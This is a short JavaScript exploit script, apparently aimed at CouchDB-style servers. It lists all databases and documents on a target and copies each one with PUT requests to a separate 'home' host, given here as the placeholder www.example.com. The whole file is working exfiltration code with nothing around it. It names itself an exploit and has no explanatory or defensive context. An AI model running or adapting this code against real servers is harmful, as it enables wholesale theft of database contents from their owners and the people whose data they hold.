var home = "http://www.example.com";

function empty () {}

function http(method, host, url, data, callback)	{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() { 
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
            callback(url, xmlHttp.responseText);
    }
    xmlHttp.open(method, host + url, true); // true for asynchronous 
    xmlHttp.send(data);
}


function getDbs(url, data)	{
	console.log(data);
	var dbs = JSON.parse(data);
	for(var i = 0; i < dbs.length; i++)	{
		http("PUT", home, "/" + dbs[i], null, empty);	// Create DB at home
		http("GET", target, "/" + dbs[i] + "/_all_docs", null, getDocuments);
	}
}

function getDocuments(url, data)	{
	console.log(data);
	var obj = JSON.parse(data);
	var db = url.split("/")[1];
	var docs = obj["rows"];
	for(var i = 0; i < docs.length; i++)	{
		http("GET", target, "/" + db + "/" + docs[i]["id"], null, retrieveDocument);
	}
}

function retrieveDocument(url, data)	{
	console.log(data);
	var sp = url.split("/");
	var db = sp[1];
	var id = sp[2];
	http("PUT", home, url, data, empty);
}

function exploitStart()	{
	console.log("Started exploit");
	http("GET", target, "/_all_dbs", null, getDbs);
}

